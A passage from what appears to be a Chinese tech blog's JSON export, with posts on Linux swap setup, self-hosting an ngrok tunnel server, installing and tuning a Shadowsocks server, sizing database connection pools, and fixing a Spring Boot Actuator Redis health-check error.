来查看现在的内存,可以看到里面的Swap分区变成了4095M，也就是4G内存。 123456[root@localhost swap]# free -m total used free shared buffers cachedMem: 980 910 70 3 8 575-/+ buffers/cache: 326 654Swap: 4095 0 4095[root@localhost swap]# 设置开机自动启用虚拟内存，在etc/fstab文件中加入如下命令 使用vim编辑器打开/etc/fstab文件 在文件中加入如下内容 1/usr/swap/swapfile swap swap defaults 0 0 使用reboot命令重启服务器 输入reboot 命令来重启 123456789[root@localhost swap]# rebootBroadcast message from liaocheng@localhost.localdomain (/dev/pts/1) at 3:56 ...The system is going down for reboot NOW![root@localhost swap]# Connection to 192.168.136.142 closed by remote host.Connection to 192.168.136.142 closed.[进程已完成] 重启完成过后使用free -m 命令来查看现在的内存是否挂在上了。 12345[root@localhost swap]# free -m total used free shared buffers cachedMem: 980 910 70 3 8 575-/+ buffers/cache: 326 654Swap: 4095 0 4095","categories":[{"name":"服务器","slug":"服务器","permalink":"https://gschaos.club/categories/%E6%9C%8D%E5%8A%A1%E5%99%A8/"}],"tags":[{"name":"java","slug":"java","permalink":"https://gschaos.club/tags/java/"},{"name":"服务器","slug":"服务器","permalink":"https://gschaos.club/tags/%E6%9C%8D%E5%8A%A1%E5%99%A8/"},{"name":"内存","slug":"内存","permalink":"https://gschaos.club/tags/%E5%86%85%E5%AD%98/"}]},{"title":"ngrok内网穿透","slug":"ngrok","date":"2020-08-27T16:00:00.000Z","updated":"2020-10-25T08:25:53.000Z","comments":true,"path":"ngrok/","link":"","permalink":"https://gschaos.club/ngrok/","excerpt":"ngrok是一个反向代理，它能够让你本地的web服务或tcp服务通过公共的端口和外部建立一个安全的通道，使得外网可以访问本地的计算机服务。ngrok1.x开源，ngrok2.x不开源","text":"ngrok是一个反向代理，它能够让你本地的web服务或tcp服务通过公共的端口和外部建立一个安全的通道，使得外网可以访问本地的计算机服务。ngrok1.x开源，ngrok2.x不开源 1. ngrok简介 ngrok是一个反向代理，它能够让你本地的web服务或tcp服务通过公共的端口和外部建立一个安全的通道，使得外网可以访问本地的计算机服务。ngrok1.x开源，ngrok2.x不开源 ngrok的主要用途有以下几种： 内网穿透，可代替vpn 将无外网IP的desktop映射到公网 临时搭建网络并分配二级域名 微信二次开发的本地调试 2. 准备工作自己搭建ngrok服务需要一台外网服务器，一个域名。本文中使用的服务器系统为Ubuntu 16.04。 2.1 域名有域名之后，需要配置DNS的Host Records，将准备分配给ngrok服务器的域名解析到公网服务器IP地址，如下图所示： 使用泛域名，使其能解析子域名 2.2 配置环境ngrok是基于go语言开发的，因此需要先安装go： 1sudo apt-get install golang 输入go version来验证安装： 1go versiongo version go1.6.2 linux&#x2F;amd64 设置go环境变量(好像可以不用？)： 此外还要使用git，一般ubuntu系统都会自带。 3. 搭建ngrok服务器3.1 clone ngrok1git clone https:&#x2F;&#x2F;github.com&#x2F;inconshreveable&#x2F;ngrok.gitcd ngrok 3.2 生成证书使用ngrok.com官方服务时，我们使用的是官方的SSL证书。自己建立ngrok服务，需要我们生成自己的证书，并提供携带该证书的ngrok客户端。首先指定域名： 1export NGROK_DOMAIN&#x3D;&quot;ngrok.test.website&quot; 生成证书： 1openssl genrsa -out rootCA.key 2048openssl req -x509 -new -nodes -key rootCA.key -subj &quot;&#x2F;CN&#x3D;$NGROK_DOMAIN&quot; -days 5000 -out rootCA.pemopenssl genrsa -out device.key 2048openssl req -new -key device.key -subj &quot;&#x2F;CN&#x3D;$NGROK_DOMAIN&quot; -out device.csropenssl x509 -req -in device.csr -CA rootCA.pem -CAkey rootCA.key -CAcreateserial -out device.crt -days 5000 我们在编译可执行文件之前，需要把生成的证书分别替换到 assets/client/tls和assets/server/tls中，这两个目录分别存放着ngrok和ngrokd的默认证书。 1cp rootCA.pem assets&#x2F;client&#x2F;tls&#x2F;ngrokroot.crtcp device.crt assets&#x2F;server&#x2F;tls&#x2F;snakeoil.crtcp device.key assets&#x2F;server&#x2F;tls&#x2F;snakeoil.key 3.3 编译ngrok有没有release的区别是，包含release的编译结果会把assets目录下的内容包括进去，从而可以独立执行。如果你今后还要更换证书，建议编译不包含release的版本。。首先编译ngrok服务端（ngrokd），默认为Linux版本： 12make cleanmake release-server 如果make clean报错，忽略make clean直接执行make release-server。 编译过程需要等待一会，因为需要通过git安装相关依赖包。如果提示没有权限，使用sudo命令来安装。 在编译客户端的时候需要指明对应的操作系统和构架： Linux 平台 32 位系统：GOOS=linux GOARCH=386 Linux 平台 64 位系统：GOOS=linux GOARCH=amd64 Windows 平台 32 位系统：GOOS=windows GOARCH=386 Windows 平台 64 位系统：GOOS=windows GOARCH=amd64 MAC 平台 32 位系统：GOOS=darwin GOARCH=386 MAC 平台 64 位系统：GOOS=darwin GOARCH=amd64 ARM 平台：GOOS=linux GOARCH=arm 例如编译Linux64位的客户端： 1GOOS&#x3D;linux GOARCH&#x3D;amd64 make release-client 生成的文件放在/bin对应的文件夹中，如windows 64位的为：windows_amd64，默认版本的文件就在根目录下。 3.4 启动ngrokd服务器编译后生成两个文件分别为服务端（ngrokd）和客户端(ngrok)。切换到对应的文件夹，运行服务端： 1.&#x2F;ngrokd -domain&#x3D;&quot;$NGROK_DOMAIN&quot; -httpAddr&#x3D;&quot;:801&quot; -httpsAddr&#x3D;&quot;:802&quot; 参数-domain表示服务器域名，请改成你自己的域名；-httpAddr表示默认监听的HTTP端口，-httpsAddr表示默认监听的HTTPS端口，因为我用不到所以都设置成空字符串”“来关闭监听，如果需要打开的话记得格式是:12345（冒号+端口号）这样的；-tunnelAddr表示服务器监听客户端连接的隧道端口号，格式和前面一样；-log表示日志文件位置；还有个-log-level用来控制日志记录的事件级别，选项有DEBUG、INFO、WARNING、ERROR。 如果编译的是不带release的版本，还可以通过-tlsCrt和-tlsKey选项来指定证书文件的位置。 出现类似以下内容，则说明我们的服务器端ngrokd正常运行了: 12345678[16:41:56 CST 2017/04/20] [INFO] (ngrok/log.(*PrefixLogger).Info:83) [registry] [tun] No affinity cache specified[16:41:56 CST 2017/04/20] [INFO] (ngrok/log.(*PrefixLogger).Info:83) [metrics] Reporting every 30 seconds[16:41:57 CST 2017/04/20] [INFO] (ngrok/log.Info:112) Listening for public http connections on [::]:80[16:41:57 CST 2017/04/20] [INFO] (ngrok/log.Info:112) Listening for public https connections on [::]:443[16:41:57 CST 2017/04/20] [INFO] (ngrok/log.Info:112) Listening for control and proxy connections on [::]:4443[16:41:57 CST 2017/04/20] [INFO] (ngrok/log.(*PrefixLogger).Info:83) [tun:627acc92] New connection from 42.53.196.242:9386[16:41:57 CST 2017/04/20] [DEBG] (ngrok/log.(*PrefixLogger).Debug:79) [tun:627acc92] Waiting to read message[16:41:57 CST 2017/04/20] [DEBG] (ngrok/log.(*PrefixLogger).Debug:79) [tun:627acc92] Reading message with length: 159 如果需要后台运行可以使用screen或nohup，详情自行搜索。 4. 配置ngrok客户端将之前编译好的客户端文件拷贝到需要使用服务的设备上。 4.1 建立配置文件在ngrok同路径下建立配置文件ngrok.yml： 1234567server_addr: “ngrok.test.website:4443&quot;trust_host_root_certs: falsetunnels: ssh: remote_port: 6666 proto: tcp: 22 server_addr端口默认4443，可通过ngrokd服务端启动修改端口。在tunnels里配置隧道信息，具体可见「翻译」ngrok 1.X 配置文档。注意http和https隧道可设置subdomain和auth，而tcp里只能设置remote_port。 还可以转发其他IP的端口，方法就是在proto下的tcp（或http、https）后的端口号写成IP地址:端口号的格式（中间是英文冒号）。如：tcp: 192.168.11.1:80 4.2 运行客户端现在运行客户端： 1.&#x2F;ngrok -config&#x3D;ngrok.yml start ssh 回车后，看到这样一个界面，说明启动成功： 如果显示reconnecting说明连接有错，在运行时加入-log=stdout来进行debug。可能有以下几方面原因： 可能是服务器端口未开放，在服务器上使用sudo iptables --list查看当前规则 查看是否网络问题，ping到对应的地址检查 可能是编译的时候证书没有覆盖或者版本不对，重新编译试试 这里有几个注意的点： 在使用ECS时，注意是否在安全组中配置了相关端口。例如上边服务端和客户端使用的4443。 这里有些一键安装脚本，大家可参考，有些配置和版本已经过时： https://gist.github.com/popucui/18c342baefefed2ba66f87a9420efae5 https://github.com/sunnyos/ngrok/blob/master/ngrok.sh Nginx 代理共享80出口微信公众号开发时，要求后端服务没有端口。那么我们ngrok服务的http端口就需要设置为80。问题来了，我们服务器上还可能跑着其他应用，比如我的ECS上还跑了我的博客实例。这怎么办呢？解决方案是使用nginx的反向代理。 nginx 的安装配置，大家可自行百度，这里不做过多描述。 大家只需在nginx的配置中增加一段server配置，如下： 12345678910111213server &#123; server_name *.ngrok.pylixm.top listen 80; keepalive_timeout 70; proxy_set_header &quot;Host&quot; $host:8081; # 必须, 8081 为ngrok http转发端口 location / &#123; proxy_pass_header Server; proxy_redirect off; proxy_pass http://127.0.0.1:8081; # 必须, 8081 为ngrok http转发端口 &#125; access_log off; log_not_found off;&#125; 这样我们可以直接使用`*.ngrok.pylixm.top` 这个子域名访问ngrok代理的我们本地的服务了，同时还又不影响其他的80端口服务。 5. 详细资料 以下是我搭建服务器时参考的一些资料： 基础知识：一分钟实现内网穿透（ngrok服务器搭建） 配置文档：「翻译」ngrok 1.X 配置文档 源码分析：ngrok原理浅析 后续定制优化：CentOS7配置ngrok实现内网穿透 给ngrok添加身份验证 关于 ngrok 使用上的注意事项 从零教你搭建ngrok服务，解决外网调试本地站点 搭建并配置优雅的 ngrok 服务实现内网穿透","categories":[{"name":"服务器","slug":"服务器","permalink":"https://gschaos.club/categories/%E6%9C%8D%E5%8A%A1%E5%99%A8/"}],"tags":[{"name":"java","slug":"java","permalink":"https://gschaos.club/tags/java/"},{"name":"ngrok","slug":"ngrok","permalink":"https://gschaos.club/tags/ngrok/"},{"name":"内网穿透","slug":"内网穿透","permalink":"https://gschaos.club/tags/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/"}]},{"title":"Ubuntu 16.04下Shadowsocks服务器端安装及优化","slug":"Ubuntu Shadowsocks","date":"2020-08-21T16:00:00.000Z","updated":"2020-10-25T08:28:06.000Z","comments":true,"path":"Ubuntu Shadowsocks/","link":"","permalink":"https://gschaos.club/Ubuntu%20Shadowsocks/","excerpt":"Ubuntu 16.04下Shadowsocks服务器端安装及优化","text":"Ubuntu 16.04下Shadowsocks服务器端安装及优化 Ubuntu 16.04下Shadowsocks服务器端安装及优化前言本教程旨在提供简明的Ubuntu 16.04下安装服务器端Shadowsocks。不同于Ubuntu 16.04之前的教程，本文抛弃initd，转而使用Ubuntu 16.04支持的Systemd管理Shadowsocks的启动与停止，显得更为便捷。优化部分包括BBR、TCP Fast Open以及吞吐量优化。 本教程仅适用于Ubuntu 16.04及之后的版本，基于Python 3，支持IPv6。 安装pip本教程使用Python 3为载体，因Python 3对应的包管理器pip3并未预装，首先安装pip3： Bash 1sudo apt install python3-pip 安装Shadowsocks因Shadowsocks作者不再维护pip中的Shadowsocks（定格在了2.8.2），我们使用下面的命令来安装最新版的Shadowsocks： Bash 1pip3 install https://github.com/shadowsocks/shadowsocks/archive/master.zip 安装完成后可以使用下面这个命令查看Shadowsocks版本： Bash 1sudo ssserver --version 目前会显示“Shadowsocks 3.0.0”。 创建配置文件创建Shadowsocks配置文件所在文件夹： Bash 1sudo mkdir /etc/shadowsocks 然后创建配置文件： Bash 1sudo nano /etc/shadowsocks/config.json 复制粘贴如下内容（注意修改密码“password”）： JSON 12345678910&#123; &quot;server&quot;:&quot;::&quot;, &quot;server_port&quot;:8388, &quot;local_address&quot;: &quot;127.0.0.1&quot;, &quot;local_port&quot;:1080, &quot;password&quot;:&quot;mypassword&quot;, &quot;timeout&quot;:300, &quot;method&quot;:&quot;aes-256-cfb&quot;, &quot;fast_open&quot;: false&#125; 然后按Ctrl + O保存文件，Ctrl + X退出。 测试Shadowsocks配置首先记录下服务器的IP地址 Bash 1ifconfig 找到IPv4地址（和IPv6地址），如我的ifconfig输出为 123456789eth0 Link encap:Ethernet HWaddr 46:91:89:4e:c1:52 inet addr:138.68.51.55 Bcast:138.68.63.255 Mask:255.255.240.0 inet6 addr: fe80::4491:89ff:fe4e:c152&#x2F;64 Scope:Link inet6 addr: 2604:a880:2:d0::3727:7001&#x2F;64 Scope:Global UP BROADCAST RUNNING MULTICAST MTU:1500 Metric:1 RX packets:102667 errors:0 dropped:0 overruns:0 frame:0 TX packets:7869 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:1000 RX bytes:151166937 (151.1 MB) TX bytes:1151476 (1.1 MB) 所以我的IPv4地址是138.68.51.55，IPv6地址是2604:a880:2:d0::3727:7001。 然后来测试下Shadowsocks能不能正常工作了： Bash 1ssserver -c /etc/shadowsocks/config.json 在Shadowsocks客户端添加服务器，如果你使用的是我提供的那个配置文件的话，地址填写你的IPv4地址或IPv6地址，端口号为8388，加密方法为aes-256-cfb，密码为你设置的密码。然后设置客户端使用全局模式，浏览器登录Google试试应该能直接打开了。 这时浏览器登录http://ip138.com/就会显示Shadowsocks服务器的IP啦！ 测试完毕，按Ctrl + C关闭Shadowsocks。 配置Systemd管理Shadowsocks新建Shadowsocks管理文件 Bash 1sudo nano /etc/systemd/system/shadowsocks-server.service 复制粘贴： 12345678910[Unit]Description&#x3D;Shadowsocks ServerAfter&#x3D;network.target[Service]ExecStart&#x3D;&#x2F;usr&#x2F;local&#x2F;bin&#x2F;ssserver -c &#x2F;etc&#x2F;shadowsocks&#x2F;config.jsonRestart&#x3D;on-abort[Install]WantedBy&#x3D;multi-user.target Ctrl + O保存文件，Ctrl + X退出。 启动Shadowsocks： Bash 1sudo systemctl start shadowsocks-server 设置开机启动Shadowsocks： Bash 1sudo systemctl enable shadowsocks-server 至此，Shadowsock服务器端的基本配置已经全部完成了！ 优化这部分属于进阶操作，在你使用Shadowsocks时感觉到延迟较大，或吞吐量较低时，可以考虑对服务器端进行优化。 开启BBRBBR系Google最新开发的TCP拥塞控制算法，目前有着较好的带宽提升效果，甚至不比老牌的锐速差。 升级Linux内核BBR在Linux kernel 4.9引入。首先检查服务器kernel版本： Bash 1uname -r 如果其显示版本在4.9.0之下，则需要升级Linux内核，否则请忽略下文。 更新包管理器： Bash 1sudo apt update 查看可用的Linux内核版本： Bash 1sudo apt-cache showpkg linux-image 找到一个你想要升级的Linux内核版本，如“linux-image-4.10.0-22-generic”： Bash 1sudo apt install linux-image-4.10.0-22-generic 等待安装完成后重启服务器： Bash 1sudo reboot 删除老的Linux内核： Bash 1sudo purge-old-kernels 开启BBR运行lsmod | grep bbr，如果结果中没有tcp_bbr，则先运行： Bash 12modprobe tcp_bbrecho &quot;tcp_bbr&quot; &gt;&gt; /etc/modules-load.d/modules.conf 运行： Bash 12echo &quot;net.core.default_qdisc=fq&quot; &gt;&gt; /etc/sysctl.confecho &quot;net.ipv4.tcp_congestion_control=bbr&quot; &gt;&gt; /etc/sysctl.conf 运行： Bash 1sysctl -p 保存生效。运行： Bash 12sysctl net.ipv4.tcp_available_congestion_controlsysctl net.ipv4.tcp_congestion_control 若均有bbr，则开启BBR成功。 优化吞吐量新建配置文件： Bash 1sudo nano /etc/sysctl.d/local.conf 复制粘贴： 1234567891011121314151617181920212223242526272829303132333435363738394041# max open filesfs.file-max &#x3D; 51200# max read buffernet.core.rmem_max &#x3D; 67108864# max write buffernet.core.wmem_max &#x3D; 67108864# default read buffernet.core.rmem_default &#x3D; 65536# default write buffernet.core.wmem_default &#x3D; 65536# max processor input queuenet.core.netdev_max_backlog &#x3D; 4096# max backlognet.core.somaxconn &#x3D; 4096# resist SYN flood attacksnet.ipv4.tcp_syncookies &#x3D; 1# reuse timewait sockets when safenet.ipv4.tcp_tw_reuse &#x3D; 1# turn off fast timewait sockets recyclingnet.ipv4.tcp_tw_recycle &#x3D; 0# short FIN timeoutnet.ipv4.tcp_fin_timeout &#x3D; 30# short keepalive timenet.ipv4.tcp_keepalive_time &#x3D; 1200# outbound port rangenet.ipv4.ip_local_port_range &#x3D; 10000 65000# max SYN backlognet.ipv4.tcp_max_syn_backlog &#x3D; 4096# max timewait sockets held by system simultaneouslynet.ipv4.tcp_max_tw_buckets &#x3D; 5000# turn on TCP Fast Open on both client and server sidenet.ipv4.tcp_fastopen &#x3D; 3# TCP receive buffernet.ipv4.tcp_rmem &#x3D; 4096 87380 67108864# TCP write buffernet.ipv4.tcp_wmem &#x3D; 4096 65536 67108864# turn on path MTU discoverynet.ipv4.tcp_mtu_probing &#x3D; 1net.ipv4.tcp_congestion_control &#x3D; bbr 运行： Bash 1sysctl --system 编辑之前的shadowsocks-server.service文件： Bash 1sudo nano /etc/systemd/system/shadowsocks-server.service 在ExecStart前插入一行，内容为： 1ExecStartPre&#x3D;&#x2F;bin&#x2F;sh -c &#39;ulimit -n 51200&#39; 即修改后的shadowsocks-server.service内容为： 1234567891011[Unit]Description&#x3D;Shadowsocks ServerAfter&#x3D;network.target[Service]ExecStartPre&#x3D;&#x2F;bin&#x2F;sh -c &#39;ulimit -n 51200&#39;ExecStart&#x3D;&#x2F;usr&#x2F;local&#x2F;bin&#x2F;ssserver -c &#x2F;etc&#x2F;shadowsocks&#x2F;config.jsonRestart&#x3D;on-abort[Install]WantedBy&#x3D;multi-user.target Ctrl + O保存文件，Ctrl + X退出。 重载shadowsocks-server.service： Bash 1sudo systemctl daemon-reload 重启Shadowsocks： Bash 1sudo systemctl restart shadowsocks-server 开启TCP Fast OpenTCP Fast Open可以降低Shadowsocks服务器和客户端的延迟。实际上在上一步已经开启了TCP Fast Open，现在只需要在Shadowsocks配置中启用TCP Fast Open。 编辑config.json： Bash 1sudo nano /etc/shadowsocks/config.json 将fast_open的值由false修改为true。Ctrl + O保存文件，Ctrl + X退出。 重启Shadowsocks： Bash 1sudo systemctl restart shadowsocks-server 注意：TCP Fast Open同时需要客户端的支持，即客户端Linux内核版本为3.7.1及以上；你可以在Shadowsocks客户端中启用TCP Fast Open。 至此，Shadowsock服务器端的优化已经全部完成了！ 参考 怎么能更新到2.9.0呢? · Issue #622 · shadowsocks/shadowsocks Configuration via Config File · shadowsocks/shadowsocks Wiki apt - List all versions of a package - Ask Ubuntu How do I use apt-get to update to the latest kernel? - Ask Ubuntu RemoveOldKernels - Community Help Wiki 开启TCP BBR拥塞控制算法 · iMeiji/shadowsocks_install Wiki Optimizing Shadowsocks · shadowsocks/shadowsocks Wiki TCP Fast Open · shadowsocks/shadowsocks Wiki","categories":[{"name":"java","slug":"java","permalink":"https://gschaos.club/categories/java/"}],"tags":[{"name":"java","slug":"java","permalink":"https://gschaos.club/tags/java/"}]},{"title":"数据库连接池到底应该设多大？这篇文章可能会颠覆你的认知","slug":"How many connections are appropriate","date":"2020-08-06T16:00:00.000Z","updated":"2020-10-25T08:23:47.000Z","comments":true,"path":"How many connections are appropriate/","link":"","permalink":"https://gschaos.club/How%20many%20connections%20are%20appropriate/","excerpt":"数据库连接池的配置是开发者们常常搞出坑的地方，在配置数据库连接池时，有几个可以说是和直觉背道而驰的原则需要明确。","text":"数据库连接池的配置是开发者们常常搞出坑的地方，在配置数据库连接池时，有几个可以说是和直觉背道而驰的原则需要明确。 本文内容95%译自这篇文章：https://github.com/brettwooldridge/HikariCP/wiki/About-Pool-Sizing 背景数据库连接池大小往往是一个很容易被大家所忽略的参数，通常这个参数也和公司或者组内文化有关系，以前在美团的时候基本所有的项目连接池大小都设置20， 当时也没有考虑为什么会这么设置，反正就跟着大伙儿用。后来来到了猿辅导，发现大家使用的连接池是tomcat-jdbc，并没有针对连接池大小做特殊配置，使用的是默认的100。 在日常的时候无论设置成20，设置成100对于我们基本感觉不到有什么差别，但是前段时间对系统进行了打压，我们明显发现在一定压力下数据库的压力很大，于是我们对数据库连接池进行了调整，经过逐渐的减少连接池大小，以及等待时间，发现数据库连接池减少至20是一个比较合适的值。当然这个值并不适合所有业务，这一块需要经过各自业务的打压，根据信息统计出一个较为合适的值。当然有关数据库连接池的介绍可以看下面的文章。 接下来是作者原正文数据库连接池的配置是开发者们常常搞出坑的地方，在配置数据库连接池时，有几个可以说是和直觉背道而驰的原则需要明确。 1万并发用户访问想象你有一个网站，压力虽然还没到Facebook那个级别，但也有个1万上下的并发访问——也就是说差不多2万左右的TPS。那么这个网站的数据库连接池应该设置成多大呢？结果可能会让你惊讶，因为这个问题的正确问法是： “这个网站的数据库连接池应该设置成多小呢？”下面这个视频是Oracle Real World Performance Group发布的，请先看完：http://www.dailymotion.com/video/x2s8uec （因为这视频是英文解说且没有字幕，我替大家做一下简单的概括：）视频中对Oracle数据库进行压力测试，9600并发线程进行数据库操作，每两次访问数据库的操作之间sleep 550ms，一开始设置的中间件线程池大小为2048： 初始化配置 压测跑起来之后是这个样子的： 2048连接时的性能数据每个请求要在连接池队列里等待33ms，获得连接后执行SQL需要77ms 此时数据库的等待事件是这个熊样的： 各种buffer busy waits，数据库CPU在95%左右（这张图里没截到CPU） 接下来，把中间件连接池减到1024（并发什么的都不变），性能数据变成了这样： 获取链接等待时长没怎么变，但是执行SQL的耗时减少了。下面这张图，上半部分是wait，下半部分是吞吐量 能看到，中间件连接池从2048减半之后，吐吞量没变，但wait事件减少了一半。 接下来，把数据库连接池减到96，并发线程数仍然是9600不变。 96个连接时的性能数据队列平均等待1ms，执行SQL平均耗时2ms。 image.pngwait事件几乎没了，吞吐量上升。 没有调整任何其他东西，仅仅只是缩小了中间件层的数据库连接池，就把请求响应时间从100ms左右缩短到了3ms。 But why?为什么nginx只用4个线程发挥出的性能就大大超越了100个进程的Apache HTTPD？回想一下计算机科学的基础知识，答案其实是很明显的。 即使是单核CPU的计算机也能“同时”运行数百个线程。但我们都[应该]知道这只不过是操作系统用时间分片玩的一个小把戏。一颗CPU核心同一时刻只能执行一个线程，然后操作系统切换上下文，核心开始执行另一个线程的代码，以此类推。给定一颗CPU核心，其顺序执行A和B永远比通过时间分片“同时”执行A和B要快，这是一条计算机科学的基本法则。一旦线程的数量超过了CPU核心的数量，再增加线程数系统就只会更慢，而不是更快。 这几乎就是真理了…… 有限的资源上面的说法只能说是接近真理，但还并没有这么简单，有一些其他的因素需要加入。当我们寻找数据库的性能瓶颈时，总是可以将其归为三类：CPU、磁盘、网络。把内存加进来也没有错，但比起磁盘和网络，内存的带宽要高出好几个数量级，所以就先不加了。 如果我们无视磁盘和网络，那么结论就非常简单。在一个8核的服务器上，设定连接/线程数为8能够提供最优的性能，再增加连接数就会因上下文切换的损耗导致性能下降。数据库通常把数据存储在磁盘上，磁盘又通常是由一些旋转着的金属碟片和一个装在步进马达上的读写头组成的。读/写头同一时刻只能出现在一个地方，然后它必须“寻址”到另外一个位置来执行另一次读写操作。所以就有了寻址的耗时，此外还有旋回耗时，读写头需要等待碟片上的目标数据“旋转到位”才能进行操作。使用缓存当然是能够提升性能的，但上述原理仍然成立。 在这一时间段（即”I/O等待”）内，线程是在“阻塞”着等待磁盘，此时操作系统可以将那个空闲的CPU核心用于服务其他线程。所以，由于线程总是在I/O上阻塞，我们可以让线程/连接数比CPU核心多一些，这样能够在同样的时间内完成更多的工作。 那么应该多多少呢？这要取决于磁盘。较新型的SSD不需要寻址，也没有旋转的碟片。可别想当然地认为“SSD速度更快，所以我们应该增加线程数”，恰恰相反，无需寻址和没有旋回耗时意味着更少的阻塞，所以更少的线程[更接近于CPU核心数]会发挥出更高的性能。只有当阻塞创造了更多的执行机会时，更多的线程数才能发挥出更好的性能。 网络和磁盘类似。通过以太网接口读写数据时也会形成阻塞，10G带宽会比1G带宽的阻塞少一些，1G带宽又会比100M带宽的阻塞少一些。不过网络通常是放在第三位考虑的，有些人会在性能计算中忽略它们。 上图是PostgreSQL的benchmark数据，可以看到TPS增长率从50个连接数开始变缓。在上面Oracle的视频中，他们把连接数从2048降到了96，实际上96都太高了，除非服务器有16或32颗核心。 计算公式下面的公式是由PostgreSQL提供的，不过我们认为可以广泛地应用于大多数数据库产品。你应该模拟预期的访问量，并从这一公式开始测试你的应用，寻找最合适的连接数值。 连接数 = ((核心数 * 2) + 有效磁盘数) 核心数不应包含超线程(hyper thread)，即使打开了hyperthreading也是。如果活跃数据全部被缓存了，那么有效磁盘数是0，随着缓存命中率的下降，有效磁盘数逐渐趋近于实际的磁盘数。这一公式作用于SSD时的效果如何尚未有分析。 按这个公式，你的4核i7数据库服务器的连接池大小应该为((4 * 2) + 1) = 9。取个整就算是是10吧。是不是觉得太小了？跑个性能测试试一下，我们保证它能轻松搞定3000用户以6000TPS的速率并发执行简单查询的场景。如果连接池大小超过10，你会看到响应时长开始增加，TPS开始下降。 笔者注：这一公式其实不仅适用于数据库连接池的计算，大部分涉及计算和I/O的程序，线程数的设置都可以参考这一公式。我之前在对一个使用Netty编写的消息收发服务进行压力测试时，最终测出的最佳线程数就刚好是CPU核心数的一倍。 公理：你需要一个小连接池，和一个充满了等待连接的线程的队列如果你有10000个并发用户，设置一个10000的连接池基本等于失了智。1000仍然很恐怖。即是100也太多了。你需要一个10来个连接的小连接池，然后让剩下的业务线程都在队列里等待。连接池中的连接数量应该等于你的数据库能够有效同时进行的查询任务数（通常不会高于2*CPU核心数）。 我们经常见到一些小规模的web应用，应付着大约十来个的并发用户，却使用着一个100连接数的连接池。这会对你的数据库造成极其不必要的负担。 请注意连接池的大小最终与系统特性相关。 比如一个混合了长事务和短事务的系统，通常是任何连接池都难以进行调优的。最好的办法是创建两个连接池，一个服务于长事务，一个服务于短事务。 再例如一个系统执行一个任务队列，只允许一定数量的任务同时执行，此时并发任务数应该去适应连接池连接数，而不是反过来。 最后在实际业务场景中，最佳的链接池数量大小最佳通常可能不能简单使用计算公式，首先是我们数据库不是只为某台机器提供链接，他会为多台机器，多个服务同时提供，所以通过核心数计算可能不是一个很好的方法。最佳的连接池还是需要通过不断压测来得到最佳的大小。当然这里需要注意的是，如果你以前使用了很大的链接池，并且使用了大事务(事务里面有I/O操作)，再你减小了链接池大小之后，你需要特别当心，很有可能会触发链接池不足的异常，所以再优化之前需要干掉你的大事务。","categories":[{"name":"数据库","slug":"数据库","permalink":"https://gschaos.club/categories/%E6%95%B0%E6%8D%AE%E5%BA%93/"}],"tags":[{"name":"数据库","slug":"数据库","permalink":"https://gschaos.club/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"}]},{"title":"redissionq启动报错涉及安全检查问题排查","slug":"redission启动涉及springcloud安全检查报错","date":"2020-07-15T16:00:00.000Z","updated":"2020-10-25T08:26:45.000Z","comments":true,"path":"redission启动涉及springcloud安全检查报错/","link":"","permalink":"https://gschaos.club/redission%E5%90%AF%E5%8A%A8%E6%B6%89%E5%8F%8Aspringcloud%E5%AE%89%E5%85%A8%E6%A3%80%E6%9F%A5%E6%8A%A5%E9%94%99/","excerpt":"","text":"[size=medium]初涉spring boot/cloud，最近有个项目启动时报redis无法连接，但又不影响正常使用检查日志发现有如下报错信息：[/size] at org.springframework.boot.actuate.health.RedisHealthIndicator.doHealthCheck(RedisHealthIndicator.java:52) at org.springframework.boot.actuate.health.AbstractHealthIndicator.health(AbstractHealthIndicator.java:43) at org.springframework.boot.actuate.health.CompositeHealthIndicator.health(CompositeHealthIndicator.java:68) at org.springframework.boot.actuate.endpoint.HealthEndpoint.invoke(HealthEndpoint.java:85) [size=medium]项目中没有明确指定Actuator监控Redis，因此怀疑是Actuator发现项目有redis时，默认自动监控的。 有两个解决方案：第一种：允许Actuator监控Redis连接在application.yml中增加配置：[/size] spring: redis: database: 0 host: 127.0.0.1 port: 6379 password: timeout: 0 pool: max-active: 8 max-wait: -1 max-idle: 8 min-idle: 0 [size=medium]第二种：禁止Actuator监控Redis连接在application.yml中增加配置：[/size] management: health: redis: enabled: false [size=medium]完整的报错信息如下：[/size] org.springframework.data.redis.RedisConnectionFailureException: Cannot get Jedis connection; nested exception is redis.clients.jedis.exceptions.JedisConnectionException: Could not get a resource from the pool at org.springframework.data.redis.connection.jedis.JedisConnectionFactory.fetchJedisConnector(JedisConnectionFactory.java:204) at org.springframework.data.redis.connection.jedis.JedisConnectionFactory.getConnection(JedisConnectionFactory.java:348) at org.springframework.data.redis.core.RedisConnectionUtils.doGetConnection(RedisConnectionUtils.java:129) at org.springframework.data.redis.core.RedisConnectionUtils.getConnection(RedisConnectionUtils.java:92) at org.springframework.data.redis.core.RedisConnectionUtils.getConnection(RedisConnectionUtils.java:79) at org.springframework.boot.actuate.health.RedisHealthIndicator.doHealthCheck(RedisHealthIndicator.java:52) at org.springframework.boot.actuate.health.AbstractHealthIndicator.health(AbstractHealthIndicator.java:43) at org.springframework.boot.actuate.health.CompositeHealthIndicator.health(CompositeHealthIndicator.java:68) at org.springframework.boot.actuate.endpoint.HealthEndpoint.invoke(HealthEndpoint.java:85) at org.springframework.boot.actuate.endpoint.HealthEndpoint.invoke(HealthEndpoint.java:35) at org.springframework.boot.actuate.endpoint.jmx.DataEndpointMBean.getData(DataEndpointMBean.java:46) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at sun.reflect.misc.Trampoline.invoke(MethodUtil.java:71) at sun.reflect.GeneratedMethodAccessor186.invoke(Unknown Source) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at sun.reflect.misc.MethodUtil.invoke(MethodUtil.java:275) at javax.management.modelmbean.RequiredModelMBean$4.run(RequiredModelMBean.java:1252) at java.security.AccessController.doPrivileged(Native Method) at java.security.ProtectionDomain$JavaSecurityAccessImpl.doIntersectionPrivilege(ProtectionDomain.java:80) at javax.management.modelmbean.RequiredModelMBean.invokeMethod(RequiredModelMBean.java:1246) at 